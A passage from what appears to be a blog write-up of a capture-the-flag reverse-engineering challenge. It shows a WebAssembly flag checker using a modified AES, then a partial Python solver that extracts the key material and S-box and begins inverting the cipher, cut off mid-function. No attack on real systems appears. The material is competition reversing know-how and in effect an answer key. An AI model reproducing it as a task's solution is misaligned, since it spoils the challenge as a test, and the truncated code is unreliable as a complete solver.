i32.store8</span><br><span class="line">          local.get 3</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 3</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      local.get 7</span><br><span class="line">      i32.const -64</span><br><span class="line">      i32.sub</span><br><span class="line">      local.set 9</span><br><span class="line">      local.get 1</span><br><span class="line">      i32.const 48</span><br><span class="line">      i32.and</span><br><span class="line">      i32.const 16</span><br><span class="line">      i32.add</span><br><span class="line">      local.set 4</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 1</span><br><span class="line">        local.get 5</span><br><span class="line">        i32.eq</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          block  ;; label = @4</span><br><span class="line">            local.get 4</span><br><span class="line">            local.get 1</span><br><span class="line">            local.get 1</span><br><span class="line">            local.get 4</span><br><span class="line">            i32.lt_u</span><br><span class="line">            select</span><br><span class="line">            local.set 3</span><br><span class="line">            local.get 4</span><br><span class="line">            local.get 1</span><br><span class="line">            i32.sub</span><br><span class="line">            local.set 0</span><br><span class="line">            loop  ;; label = @5</span><br><span class="line">              local.get 1</span><br><span class="line">              local.get 3</span><br><span class="line">              i32.eq</span><br><span class="line">              br_if 1 (;@4;)</span><br><span class="line">              local.get 1</span><br><span class="line">              local.get 9</span><br><span class="line">              i32.add</span><br><span class="line">              local.get 0</span><br><span class="line">              i32.store8</span><br><span class="line">              local.get 1</span><br><span class="line">              i32.const 1</span><br><span class="line">              i32.add</span><br><span class="line">              local.set 1</span><br><span class="line">              br 0 (;@5;)</span><br><span class="line">            end</span><br><span class="line">            unreachable</span><br><span class="line">          end</span><br><span class="line">        else</span><br><span class="line">          local.get 5</span><br><span class="line">          local.get 9</span><br><span class="line">          i32.add</span><br><span class="line">          local.get 0</span><br><span class="line">          local.get 5</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          i32.store8</span><br><span class="line">          local.get 5</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 5</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      local.get 4</span><br><span class="line">      i32.const 32</span><br><span class="line">      i32.ne</span><br><span class="line">      br_if 0 (;@1;)</span><br><span class="line">      i32.const 0</span><br><span class="line">      local.set 1</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 1</span><br><span class="line">        i32.const 32</span><br><span class="line">        i32.lt_u</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          local.get 1</span><br><span class="line">          local.get 9</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 2</span><br><span class="line">          local.get 1</span><br><span class="line">          local.get 7</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 10</span><br><span class="line">          i32.const 0</span><br><span class="line">          local.set 0</span><br><span class="line">          global.get 0</span><br><span class="line">          i32.const 192</span><br><span class="line">          i32.sub</span><br><span class="line">          local.tee 6</span><br><span class="line">          global.set 0</span><br><span class="line">          loop  ;; label = @4</span><br><span class="line">            local.get 0</span><br><span class="line">            i32.const 16</span><br><span class="line">            i32.eq</span><br><span class="line">            if  ;; label = @5</span><br><span class="line">              i32.const 0</span><br><span class="line">              local.set 0</span><br><span class="line">              loop  ;; label = @6</span><br><span class="line">                local.get 0</span><br><span class="line">                i32.const 16</span><br><span class="line">                i32.eq</span><br><span class="line">                if  ;; label = @7</span><br><span class="line">                  block  ;; label = @8</span><br><span class="line">                    local.get 6</span><br><span class="line">                    i32.const 16</span><br><span class="line">                    i32.sub</span><br><span class="line">                    local.set 11</span><br><span class="line">                    i32.const 1</span><br><span class="line">                    local.set 5</span><br><span class="line">                    loop  ;; label = @9</span><br><span class="line">                      local.get 5</span><br><span class="line">                      i32.const 11</span><br><span class="line">                      i32.eq</span><br><span class="line">                      br_if 1 (;@8;)</span><br><span class="line">                      local.get 5</span><br><span class="line">                      i32.const 17</span><br><span class="line">                      i32.mul</span><br><span class="line">                      local.set 4</span><br><span class="line">                      i32.const 0</span><br><span class="line">                      local.set 0</span><br><span class="line">                      local.get 11</span><br><span class="line">                      local.get 5</span><br><span class="line">                      i32.const 4</span><br><span class="line">                      i32.shl</span><br><span class="line">                      local.tee 3</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.set 2</span><br><span class="line">                      loop  ;; label = @10</span><br><span class="line">                        local.get 0</span><br><span class="line">                        i32.const 16</span><br><span class="line">                        i32.eq</span><br><span class="line">                        if  ;; label = @11</span><br><span class="line">                          local.get 5</span><br><span class="line">                          i32.const 1</span><br><span class="line">                          i32.add</span><br><span class="line">                          local.set 5</span><br><span class="line">                          br 2 (;@9;)</span><br><span class="line">                        else</span><br><span class="line">                          local.get 3</span><br><span class="line">                          local.get 6</span><br><span class="line">                          i32.add</span><br><span class="line">                          local.get 0</span><br><span class="line">                          i32.add</span><br><span class="line">                          local.get 4</span><br><span class="line">                          local.get 0</span><br><span class="line">                          local.get 2</span><br><span class="line">                          i32.add</span><br><span class="line">                          i32.load8_u</span><br><span class="line">                          i32.xor</span><br><span class="line">                          local.get 0</span><br><span class="line">                          i32.xor</span><br><span class="line">                          i32.store8</span><br><span class="line">                          local.get 0</span><br><span class="line">                          i32.const 1</span><br><span class="line">                          i32.add</span><br><span class="line">                          local.set 0</span><br><span class="line">                          br 1 (;@10;)</span><br><span class="line">                        end</span><br><span class="line">                        unreachable</span><br><span class="line">                      end</span><br><span class="line">                      unreachable</span><br><span class="line">                    end</span><br><span class="line">                    unreachable</span><br><span class="line">                  end</span><br><span class="line">                else</span><br><span class="line">                  local.get 0</span><br><span class="line">                  local.get 6</span><br><span class="line">                  i32.add</span><br><span class="line">                  local.get 0</span><br><span class="line">                  local.get 8</span><br><span class="line">                  i32.add</span><br><span class="line">                  i32.load8_u</span><br><span class="line">                  i32.store8</span><br><span class="line">                  local.get 0</span><br><span class="line">                  i32.const 1</span><br><span class="line">                  i32.add</span><br><span class="line">                  local.set 0</span><br><span class="line">                  br 1 (;@6;)</span><br><span class="line">                end</span><br><span class="line">              end</span><br><span class="line">              local.get 6</span><br><span class="line">              i32.const 176</span><br><span class="line">              i32.add</span><br><span class="line">              local.get 6</span><br><span class="line">              call 3</span><br><span class="line">              i32.const 1</span><br><span class="line">              local.set 0</span><br><span class="line">              loop  ;; label = @6</span><br><span class="line">                local.get 0</span><br><span class="line">                i32.const 11</span><br><span class="line">                i32.eq</span><br><span class="line">                if  ;; label = @7</span><br><span class="line">                  block  ;; label = @8</span><br><span class="line">                    i32.const 0</span><br><span class="line">                    local.set 0</span><br><span class="line">                    loop  ;; label = @9</span><br><span class="line">                      local.get 0</span><br><span class="line">                      i32.const 16</span><br><span class="line">                      i32.eq</span><br><span class="line">                      br_if 1 (;@8;)</span><br><span class="line">                      local.get 0</span><br><span class="line">                      local.get 10</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.get 6</span><br><span class="line">                      i32.const 176</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.get 0</span><br><span class="line">                      i32.add</span><br><span class="line">                      i32.load8_u</span><br><span class="line">                      i32.store8</span><br><span class="line">                      local.get 0</span><br><span class="line">                      i32.const 1</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.set 0</span><br><span class="line">                      br 0 (;@9;)</span><br><span class="line">                    end</span><br><span class="line">                    unreachable</span><br><span class="line">                  end</span><br><span class="line">                else</span><br><span class="line">                  local.get 6</span><br><span class="line">                  i32.const 176</span><br><span class="line">                  i32.add</span><br><span class="line">                  local.set 2</span><br><span class="line">                  i32.const 0</span><br><span class="line">                  local.set 4</span><br><span class="line">                  loop  ;; label = @8</span><br><span class="line">                    local.get 4</span><br><span class="line">                    i32.const 16</span><br><span class="line">                    i32.ne</span><br><span class="line">                    if  ;; label = @9</span><br><span class="line">                      local.get 2</span><br><span class="line">                      local.get 4</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.tee 3</span><br><span class="line">                      local.get 3</span><br><span class="line">                      i32.load8_u</span><br><span class="line">                      i32.const 1056</span><br><span class="line">                      i32.add</span><br><span class="line">                      i32.load8_u</span><br><span class="line">                      i32.store8</span><br><span class="line">                      local.get 4</span><br><span class="line">                      i32.const 1</span><br><span class="line">                      i32.add</span><br><span class="line">                      local.set 4</span><br><span class="line">                      br 1 (;@8;)</span><br><span class="line">                    end</span><br><span class="line">                  end</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=1</span><br><span class="line">                  local.set 4</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=5</span><br><span class="line">                  i32.store8 offset=1</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=9</span><br><span class="line">                  local.set 3</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=13</span><br><span class="line">                  i32.store8 offset=9</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 3</span><br><span class="line">                  i32.store8 offset=5</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 4</span><br><span class="line">                  i32.store8 offset=13</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=2</span><br><span class="line">                  local.set 3</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=10</span><br><span class="line">                  i32.store8 offset=2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 3</span><br><span class="line">                  i32.store8 offset=10</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=6</span><br><span class="line">                  local.set 3</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=14</span><br><span class="line">                  i32.store8 offset=6</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 3</span><br><span class="line">                  i32.store8 offset=14</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=15</span><br><span class="line">                  local.set 3</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=11</span><br><span class="line">                  i32.store8 offset=15</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=7</span><br><span class="line">                  i32.store8 offset=11</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 2</span><br><span class="line">                  i32.load8_u offset=3</span><br><span class="line">                  i32.store8 offset=7</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 3</span><br><span class="line">                  i32.store8 offset=3</span><br><span class="line">                  local.get 0</span><br><span class="line">                  i32.const 10</span><br><span class="line">                  i32.ne</span><br><span class="line">                  if  ;; label = @8</span><br><span class="line">                    local.get 2</span><br><span class="line">                    call 4</span><br><span class="line">                    local.get 2</span><br><span class="line">                    i32.const 4</span><br><span class="line">                    i32.add</span><br><span class="line">                    call 4</span><br><span class="line">                    local.get 2</span><br><span class="line">                    i32.const 8</span><br><span class="line">                    i32.add</span><br><span class="line">                    call 4</span><br><span class="line">                    local.get 2</span><br><span class="line">                    i32.const 12</span><br><span class="line">                    i32.add</span><br><span class="line">                    call 4</span><br><span class="line">                  end</span><br><span class="line">                  local.get 2</span><br><span class="line">                  local.get 6</span><br><span class="line">                  local.get 0</span><br><span class="line">                  i32.const 4</span><br><span class="line">                  i32.shl</span><br><span class="line">                  i32.add</span><br><span class="line">                  call 3</span><br><span class="line">                  local.get 0</span><br><span class="line">                  i32.const 1</span><br><span class="line">                  i32.add</span><br><span class="line">                  local.set 0</span><br><span class="line">                  br 1 (;@6;)</span><br><span class="line">                end</span><br><span class="line">              end</span><br><span class="line">              local.get 6</span><br><span class="line">              i32.const 192</span><br><span class="line">              i32.add</span><br><span class="line">              global.set 0</span><br><span class="line">            else</span><br><span class="line">              local.get 6</span><br><span class="line">              i32.const 176</span><br><span class="line">              i32.add</span><br><span class="line">              local.get 0</span><br><span class="line">              i32.add</span><br><span class="line">              local.get 0</span><br><span class="line">              local.get 2</span><br><span class="line">              i32.add</span><br><span class="line">              i32.load8_u</span><br><span class="line">              i32.store8</span><br><span class="line">              local.get 0</span><br><span class="line">              i32.const 1</span><br><span class="line">              i32.add</span><br><span class="line">              local.set 0</span><br><span class="line">              br 1 (;@4;)</span><br><span class="line">            end</span><br><span class="line">          end</span><br><span class="line">          local.get 1</span><br><span class="line">          i32.const 16</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 1</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      i32.const 0</span><br><span class="line">      local.set 1</span><br><span class="line">      loop  ;; label = @2</span><br><span class="line">        local.get 1</span><br><span class="line">        local.tee 0</span><br><span class="line">        i32.const 32</span><br><span class="line">        i32.ne</span><br><span class="line">        if  ;; label = @3</span><br><span class="line">          local.get 0</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 1</span><br><span class="line">          local.get 0</span><br><span class="line">          local.get 7</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          local.get 0</span><br><span class="line">          i32.const 1312</span><br><span class="line">          i32.add</span><br><span class="line">          i32.load8_u</span><br><span class="line">          i32.eq</span><br><span class="line">          br_if 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      local.get 0</span><br><span class="line">      i32.const 31</span><br><span class="line">      i32.gt_u</span><br><span class="line">      local.set 2</span><br><span class="line">    end</span><br><span class="line">    local.get 7</span><br><span class="line">    i32.const 144</span><br><span class="line">    i32.add</span><br><span class="line">    global.set 0</span><br><span class="line">    local.get 2)</span><br><span class="line">  (func (;2;) (type 3) (param i32 i32 i32) (result i32)</span><br><span class="line">    local.get 2</span><br><span class="line">    i32.const -23</span><br><span class="line">    i32.mul</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 1</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.add</span><br><span class="line">    i32.const 255</span><br><span class="line">    i32.and)</span><br><span class="line">  (func (;3;) (type 4) (param i32 i32)</span><br><span class="line">    (local i32 i32)</span><br><span class="line">    loop  ;; label = @1</span><br><span class="line">      local.get 2</span><br><span class="line">      i32.const 16</span><br><span class="line">      i32.ne</span><br><span class="line">      if  ;; label = @2</span><br><span class="line">        local.get 0</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.add</span><br><span class="line">        local.tee 3</span><br><span class="line">        local.get 3</span><br><span class="line">        i32.load8_u</span><br><span class="line">        local.get 1</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.add</span><br><span class="line">        i32.load8_u</span><br><span class="line">        i32.xor</span><br><span class="line">        i32.store8</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.set 2</span><br><span class="line">        br 1 (;@1;)</span><br><span class="line">      end</span><br><span class="line">    end)</span><br><span class="line">  (func (;4;) (type 0) (param i32)</span><br><span class="line">    (local i32 i32 i32 i32 i32 i32 i32)</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.load8_u offset=1</span><br><span class="line">    local.tee 2</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.load8_u</span><br><span class="line">    local.tee 3</span><br><span class="line">    i32.xor</span><br><span class="line">    local.tee 4</span><br><span class="line">    call 5</span><br><span class="line">    local.get 3</span><br><span class="line">    i32.xor</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.load8_u offset=2</span><br><span class="line">    local.tee 5</span><br><span class="line">    local.get 4</span><br><span class="line">    i32.xor</span><br><span class="line">    local.tee 6</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.load8_u offset=3</span><br><span class="line">    local.tee 1</span><br><span class="line">    i32.xor</span><br><span class="line">    local.tee 7</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.store8</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 2</span><br><span class="line">    local.get 5</span><br><span class="line">    i32.xor</span><br><span class="line">    call 5</span><br><span class="line">    local.get 2</span><br><span class="line">    i32.xor</span><br><span class="line">    local.get 7</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.store8 offset=1</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 1</span><br><span class="line">    local.get 5</span><br><span class="line">    i32.xor</span><br><span class="line">    call 5</span><br><span class="line">    local.get 1</span><br><span class="line">    i32.xor</span><br><span class="line">    local.get 4</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.store8 offset=2</span><br><span class="line">    local.get 0</span><br><span class="line">    local.get 1</span><br><span class="line">    local.get 3</span><br><span class="line">    i32.xor</span><br><span class="line">    call 5</span><br><span class="line">    local.get 6</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.store8 offset=3)</span><br><span class="line">  (func (;5;) (type 5) (param i32) (result i32)</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.extend8_s</span><br><span class="line">    i32.const 7</span><br><span class="line">    i32.shr_u</span><br><span class="line">    i32.const 27</span><br><span class="line">    i32.and</span><br><span class="line">    local.get 0</span><br><span class="line">    i32.const 1</span><br><span class="line">    i32.shl</span><br><span class="line">    i32.xor</span><br><span class="line">    i32.const 255</span><br><span class="line">    i32.and)</span><br><span class="line">  (func (;6;) (type 0) (param i32)</span><br><span class="line">    local.get 0</span><br><span class="line">    global.set 0)</span><br><span class="line">  (func (;7;) (type 6) (result i32)</span><br><span class="line">    global.get 0)</span><br><span class="line">  (table (;0;) 2 2 funcref)</span><br><span class="line">  (memory (;0;) 258 258)</span><br><span class="line">  (global (;0;) (mut i32) (i32.const 66880))</span><br><span class="line">  (export &quot;memory&quot; (memory 0))</span><br><span class="line">  (export &quot;check&quot; (func 1))</span><br><span class="line">  (export &quot;__indirect_function_table&quot; (table 0))</span><br><span class="line">  (export &quot;_initialize&quot; (func 0))</span><br><span class="line">  (export &quot;_emscripten_stack_restore&quot; (func 6))</span><br><span class="line">  (export &quot;emscripten_stack_get_current&quot; (func 7))</span><br><span class="line">  (elem (;0;) (i32.const 1) func 0)</span><br><span class="line">  (data (;0;) (i32.const 1024) &quot;\80\80XK\c6\16^\90\95\b56\aa^T\fe\9a\ab\cd\179^\82\f1Jc\b7,\90\d5\08\7f\e69&amp;-!\a815\9fj[=q\a4\8d\f1,\90\d8\93&#x27;\a0\03\1d\aa\f7\8e\f8\f5\c6\fe(\9a\ed\a7\c9|le\ad\96n\ff\bf\ab+\82kO^\9dy\99B\cc_\c0]H\da\b8\b1&#125;\e8/S\d9v@A4\00\fa\08a\8c\e9s\b9u\de\09\8bZ\b7z\a6\eb\010\91\e4c\10\16\02\95\8a\b5\f0\a1\19\17i\df\1f\a3X%\0af\c5\f2\0b\f9\1a\d5\c8\c7b\af\e6\ec\80&#123;J\a5\a9\88\97VI\b6\05\cd\1eM\9e\fd$g&gt;\07C):\db\15\86xp\ca\d2\1c\b4\e2N\84\04Q\81\bah`P\13\5c~\06\98\89\f68\cb\cf\be#\bd\92m7\d7\8f\14\f36\0c\ae\b0? \f4R\e0\22\7ftF\fc\ee\9c\b2\87.E\11\e7\d1\d0*d\ef&lt;\12Y\acT;o\0d\e3\dc\9bG\c4\bb\a2\c2K3\83\d4\ce\c1D\dd\b3\94\0fr\85\d6\fb\d3W\e5\bc\182\1b\c3wU\ea\0e\e1L\96&lt;\d1s/\ac\fe\c2\00V\e1&amp;4\9a\e1/\b5O\a3\86\fb\87\f8\91\0a\9b\00\fb\0f\8d$w&quot;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有实力的大佬请尽情享受几百行的汇编……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. 准确解析 WAT 中的 data 段 (起始地址 1024)</span></span><br><span class="line">    wat_str = <span class="string">r&quot;\80\80XK\c6\16^\90\95\b56\aa^T\fe\9a\ab\cd\179^\82\f1Jc\b7,\90\d5\08\7f\e69&amp;-!\a815\9fj[=q\a4\8d\f1,\90\d8\93&#x27;\a0\03\1d\aa\f7\8e\f8\f5\c6\fe(\9a\ed\a7\c9|le\ad\96n\ff\bf\ab+\82kO^\9dy\99B\cc_\c0]H\da\b8\b1&#125;\e8/S\d9v@A4\00\fa\08a\8c\e9s\b9u\de\09\8bZ\b7z\a6\eb\010\91\e4c\10\16\02\95\8a\b5\f0\a1\19\17i\df\1f\a3X%\0af\c5\f2\0b\f9\1a\d5\c8\c7b\af\e6\ec\80&#123;J\a5\a9\88\97VI\b6\05\cd\1eM\9e\fd$g&gt;\07C):\db\15\86xp\ca\d2\1c\b4\e2N\84\04Q\81\bah`P\13\5c~\06\98\89\f68\cb\cf\be#\bd\92m7\d7\8f\14\f36\0c\ae\b0? \f4R\e0\22\7ftF\fc\ee\9c\b2\87.E\11\e7\d1\d0*d\ef&lt;\12Y\acT;o\0d\e3\dc\9bG\c4\bb\a2\c2K3\83\d4\ce\c1D\dd\b3\94\0fr\85\d6\fb\d3W\e5\bc\182\1b\c3wU\ea\0e\e1L\96&lt;\d1s/\ac\fe\c2\00V\e1&amp;4\9a\e1/\b5O\a3\86\fb\87\f8\91\0a\9b\00\fb\0f\8d$w&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_wat_data</span>(<span class="params">s</span>):</span><br><span class="line">        res = <span class="built_in">bytearray</span>()</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            <span class="keyword">if</span> s[i] == <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">                res.append(<span class="built_in">int</span>(s[i+<span class="number">1</span>:i+<span class="number">3</span>], <span class="number">16</span>))</span><br><span class="line">                i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(<span class="built_in">ord</span>(s[i]))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"></span><br><span class="line">    blob = parse_wat_data(wat_str)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 生成 Round Key 0 (Base Key)</span></span><br><span class="line">    base_key = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        xor_part = blob[i] ^ blob[i+<span class="number">16</span>]</span><br><span class="line">        base_key[i] = (xor_part + (-<span class="number">23</span> * i)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 递推生成所有轮密钥 (0-10)</span></span><br><span class="line">    round_keys = [<span class="built_in">bytes</span>(base_key)]</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        prev_key = round_keys[-<span class="number">1</span>]</span><br><span class="line">        curr_key = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            curr_key[i] = (prev_key[i] ^ (r * <span class="number">17</span>) ^ i) &amp; <span class="number">0xFF</span></span><br><span class="line">        round_keys.append(<span class="built_in">bytes</span>(curr_key))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 提取 S 盒与 32 字节密文</span></span><br><span class="line">    sbox = <span class="built_in">list</span>(blob[<span class="number">32</span>:<span class="number">288</span>])</span><br><span class="line">    rsbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox): rsbox[v] = i</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 密文从偏移 288 开始，长度 32</span></span><br><span class="line">    full_ciphertext = blob[<span class="number">288</span>:<span class="number">320</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. AES 逆向工具函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">s</span>):</span><br><span class="line">        <span class="keyword">return</span> [s[<span class="number">0</span>], s[<span class="number">13</span>], s[<span class="number">10</span>], s[<span class="number">7</span>], s[<span class="number">4</span>], s[<span class="number">1</span>], s[<span class="number">14</span>], s[<span class="number">11</span>], s[<span class="number">8</span>], s[<span class="number">5</span>], s[<span class="number">2</span>], s[<span class="number">15</span>], s[<span class="number">12</span>], s[<span class="number">9</span>], s[<span class="number">6</span>], s[<span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xtime</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">return</span> ((x &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span> <span class="keyword">if</span> (x &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (x &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (y &gt;&gt; i) &amp; <span class="number">1</span>: res ^= x</span><br><span class="line">            x = xtime(x)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv_mix_columns</span>(<span class="params">s</span>):</span><br><span class="line">        ns = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">            c = s[i:i+<span class="number">4</span>]</span><br><span class="line">            ns[i+<span class="number">0</span>] = mul(c[<span class="number">0</span>], <span class="number">14</span>) ^ mul(c[<span class="number">1</span>], <span class="number">11</span>) ^ mul(c[<span class="number">2</span>], <span class="number">13</span>) ^ mul(c[<span class="number">3</span>], <span class="number">9</span>)</span><br><span class="line">            ns[i+<span class="number">1</span>] = mul(c[<span class="number">0</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">1</span>], <span class="number">14</span>) ^ mul(c[<span class="number">2</span>], <span class="number">11</span>) ^ mul(c[<span class="number">3</span>], <span class="number">13</span>)</span><br><span class="line">            ns[i+<span class="number">2</span>] = mul(c[<span class="number">0</span>], <span class="number">13</span>) ^ mul(c[<span class="number">1</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">2</span>], <span class="number">14</span>) ^ mul(c[<span class="number">3</span>], <span class="number">11</span>)</span><br><span class="line">            ns[i+<span class="number">3</span>] = mul(c[<span class="number">0</span>], <span class="number">11</span>) ^ mul(c[<span class="number">1</span>], <span class="number">13</span>) ^ mul(c[<span class="number">2</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">3</span>], <span class="number">14</span>)</span><br><span class="line">        <span class="keyword">return</span> ns</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">block</span>):</span><br><span class="line">        state = [b ^ k <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(block, round_keys[<span class="number">10</span>])]</span><br><span class="line">        state = inv_shift_rows(state)</span><br><span class="line">        state = [rsbox[b] <span class="keyword">for</span> b <span class="keyword">in</span> 